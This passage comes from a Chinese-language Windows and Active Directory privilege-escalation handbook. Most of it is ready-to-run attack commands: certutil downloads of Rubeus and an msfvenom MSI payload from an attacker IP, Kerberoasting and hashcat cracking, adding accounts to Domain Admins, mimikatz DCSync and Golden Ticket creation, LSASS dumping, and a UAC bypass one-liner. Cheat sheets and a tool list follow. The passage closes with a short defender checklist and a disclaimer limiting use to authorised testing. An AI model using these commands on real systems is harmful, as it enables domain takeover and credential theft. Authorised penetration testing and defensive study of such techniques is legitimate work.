C:\Windows\Temp\sh.exe -c All -d corp.local --zipfilename C:\Windows\Temp\bloodhound.zip
```

**步骤 5: Kerberoasting**

```cmd
# 上传 Rubeus
certutil -urlcache -split -f http://10.10.14.10/Rubeus.exe C:\Windows\Temp\r.exe

# 执行 Kerberoasting
C:\Windows\Temp\r.exe kerberoast /domain:corp.local /creduser:corp\svc_sql /credpassword:"P@ssw0rd2024!" /outfile:C:\Windows\Temp\hashes.txt

# 获取服务账户哈希
type C:\Windows\Temp\hashes.txt
```

**步骤 6: 破解服务账户密码**

```bash
# 在攻击者机器上
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
# 破解出: svc_mssql : SQLService2024!
```

**步骤 7: 利用服务账户提权到域管理员**

```bash
# 使用 BloodHound 分析发现:
# svc_mssql 对域控制器有 GenericWrite 权限

# 利用 GenericWrite 进行基于资源的约束委派攻击
python3 rbcd.py corp.local/svc_mssql:'SQLService2024!' -dc-ip 10.10.10.10 -delegate-to 'DC01$' -delegate-from 'FAKE01$'

# 或使用 ACL 滥用
# 添加用户到 Domain Admins
net group "Domain Admins" svc_mssql /add /domain
```

**步骤 8: DCSync 获取所有域哈希**

```cmd
# 使用 mimikatz DCSync
C:\Windows\Temp\m.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /all /csv" "exit"
```

**完整时间线：**
1. 00:00 - 获得 IIS Shell
2. 00:05 - 信息收集完成
3. 00:10 - 令牌窃取获得 SYSTEM
4. 00:20 - 凭据提取完成
5. 00:30 - 域侦察完成
6. 00:45 - Kerberoasting 完成
7. 01:00 - 获得域管理员权限

### 14.2 提权链：标准用户到本地管理员

**场景：** 标准域用户 (corp\johndoe) 在 Windows 10 工作站上。

**提权链：**

```cmd
# 1. 信息收集
whoami /priv
# 发现: SeImpersonatePrivilege
# 发现: SeShutdownPrivilege

# 2. 检查 AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 两者都返回 0x1

# 3. 生成 MSI payload
# 在攻击者机器上:
msfvenom -p windows/x64/exec CMD="net localgroup Administrators corp\johndoe /add" -f msi -o adduser.msi

# 4. 上传并安装 MSI
certutil -urlcache -split -f http://10.10.14.10/adduser.msi C:\Windows\Temp\adduser.msi
msiexec /quiet /qn /i C:\Windows\Temp\adduser.msi

# 5. 验证
net localgroup Administrators
# johndoe 现在在 Administrators 组中

# 6. 提权到 SYSTEM
# 使用 PsExec
PsExec.exe -s -i cmd.exe
# 或使用 GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### 14.3 提权链：服务账户到域管理员 (DCSync)

```cmd
# 1. 获得服务账户凭据
# 通过 LSASS 转储或 Kerberoasting

# 2. 检查服务账户权限
# 使用 BloodHound 分析

# 3. 发现 Replication-Get-Changes-All 权限
# 直接 DCSync
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /all /csv" "exit"

# 4. 提取 krbtgt 哈希
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"

# 5. 生成 Golden Ticket
mimikatz.exe "privilege::debug" "kerberos::golden /domain:corp.local /sid:S-1-5-21-XXX /krbtgt:<hash> /user:Administrator /id:500 /ptt" "exit"

# 6. 验证域管理员权限
dir \\dc01.corp.local\c$
```

---

## 附录 A: 快速参考命令

### 信息收集速查

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
whoami /priv
whoami /groups
net user
net localgroup
netstat -ano | findstr "LISTENING"
wmic service get Name,PathName,StartName,StartMode
schtasks /query /fo LIST /v
wmic qfe list brief
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
```

### 提权速查

```cmd
# 令牌窃取
PrintSpoofer.exe -i -c "cmd.exe"
GodPotato.exe -cmd "cmd /c whoami"

# UAC 绕过
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f & fodhelper.exe

# 服务权限
sc config VulnerableService binPath="cmd.exe /c net localgroup Administrators user /add"

# 凭据提取
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

### 域提权速查

```cmd
# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP Roasting
Rubeus.exe asreproast /outfile:hashes.txt

# DCSync
mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv" exit

# Golden Ticket
mimikatz.exe "kerberos::golden /domain:domain.local /sid:S-1-5-21-XXX /krbtgt:hash /user:Administrator /ptt" exit
```

## 附录 B: 常用工具下载地址

| 工具 | 用途 | 获取方式 |
|------|------|---------|
| WinPEAS | 全面信息收集 | GitHub: peass-ng |
| Seatbelt | C# 信息收集 | GitHub: GhostPack/Seatbelt |
| SharpUp | 提权检查 | GitHub: GhostPack/SharpUp |
| PowerUp.ps1 | PowerShell 提权 | PowerSploit |
| Mimikatz | 凭据提取 | GitHub: gentilkiwi/mimikatz |
| Rubeus | Kerberos 攻击 | GitHub: GhostPack/Rubeus |
| Certify | ADCS 攻击 | GitHub: GhostPack/Certify |
| PrintSpoofer | 令牌窃取 | GitHub: itm4n/PrintSpoofer |
| GodPotato | 令牌窃取 | GitHub: BeichenDream/GodPotato |
| JuicyPotatoNG | 令牌窃取 | GitHub: antonioCoco/JuicyPotatoNG |
| RoguePotato | 令牌窃取 | GitHub: antonioCoco/RoguePotato |
| EfsPotato | 令牌窃取 | GitHub: zcgonvh/EfsPotato |
| SweetPotato | 令牌窃取 | GitHub: CCob/SweetPotato |
| Watson | 内核漏洞检测 | GitHub: rasta-mouse/Watson |
| Sherlock | PowerShell 漏洞检测 | GitHub: rasta-mouse/Sherlock |
| UACME | UAC 绕过 | GitHub: hfiref0x/UACME |
| LaZagne | 凭据提取 | GitHub: AlessandroZ/LaZagne |
| SharpDPAPI | DPAPI 解密 | GitHub: GhostPack/SharpDPAPI |
| SharpChrome | Chrome 凭据 | GitHub: GhostPack/SharpChrome |
| SessionGopher | 会话提取 | GitHub: Arvanaghi/SessionGopher |
| Impacket | Python 工具集 | GitHub: fortra/impacket |
| BloodHound | AD 分析 | GitHub: BloodHoundAD/BloodHound |
| PrivescCheck | PowerShell 提权 | GitHub: itm4n/PrivescCheck |
| Nanodump | LSASS 转储 | GitHub: helpsystems/nanodump |
| PPLdump | PPL 绕过 | GitHub: itm4n/PPLdump |
| HandleKatz | 句柄克隆 | GitHub: codewhitesec/HandleKatz |

## 附录 C: 防御规避建议

**蓝队检测要点：**
- 监控 `whoami /priv` 和 `systeminfo` 执行
- 监控 `sc config` 和 `sc start` 异常操作
- 监控 LSASS 进程访问 (Event ID 4663)
- 监控注册表自动运行键修改
- 监控计划任务创建/修改
- 监控 `reg save` 和卷影副本操作
- 监控 `msiexec` 异常 MSI 安装
- 启用 Credential Guard 和 LSA 保护
- 启用 HVCI 和 VBS
- 定期审计服务权限和计划任务
- 使用 Sysmon 记录进程创建事件
- 监控 Kerberos 票据请求异常 (Event ID 4769)
- 实施最小权限原则
- 定期检查 AlwaysInstallElevated 注册表

---

> **免责声明：** 本技能手册仅供安全研究和授权测试使用。未经授权对计算机系统进行提权测试属于违法行为。使用者应确保获得目标系统的明确书面授权，并遵守当地法律法规。